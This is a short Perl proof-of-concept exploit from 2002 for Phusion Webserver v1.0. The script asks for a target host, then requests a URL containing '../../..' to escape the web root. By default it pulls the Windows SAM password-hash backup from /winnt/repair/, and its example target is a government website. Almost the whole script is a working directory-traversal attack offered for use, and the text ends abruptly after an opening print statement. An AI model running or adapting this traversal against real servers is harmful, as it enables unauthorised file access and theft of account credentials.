#!/usr/bin/perl
#
# THIS SCRIPT ONLY FOR WINDOWS WITH PERL OR CYGWIN 
# 
# Simple script to get files on server. 
# 
# Maybe u need this line for windows:
# #! c:\perl\bin\perl.exe
#
# Phusion Webserver v1.0 proof-of-concept exploit.
# By Alex Hernandez <al3xhernandez@ureach.com> (C)2002.
#
# Thanks all the people from Spain and Argentina.
# Special Greets: White-B, Pablo S0r, Paco Spain, L.Martins, 
# G.Maggiotti & H.Oliveira.
# 
#
# Usage: perl -x Phusion-GET.pl <And read the Intructions>
#  
#


print("\nPhusion Webserver v1.0 GET Files exploit (c)2002.\n");
print("Alex Hernandez al3xhernandez\@ureach.com\n\n");


print <<"EOT";
Please type the address remote webserver, example: www.whitehouse.gov
[Default remote Webserver is "127.0.0.1"`]:
EOT
$host = <>;

print <<"EOT";
Please type only in the directory where the file is located you want to
download, 
example: /winnt/repair/
[default directory is "/winnt/repair/"] :#For IIS 4-5
EOT
$directory = <> || "/winnt/repair/";


print <<"EOT";
Please type in the filename you want download example: sam._ 
[default file is "sam._"] :
EOT
$file = <> || "sam._";

{
#Maybe u to change this line depending of PATH installation.
system("explorer.exe", "http://$host:80/../../..$directory$file");
}

print <<"EOT";

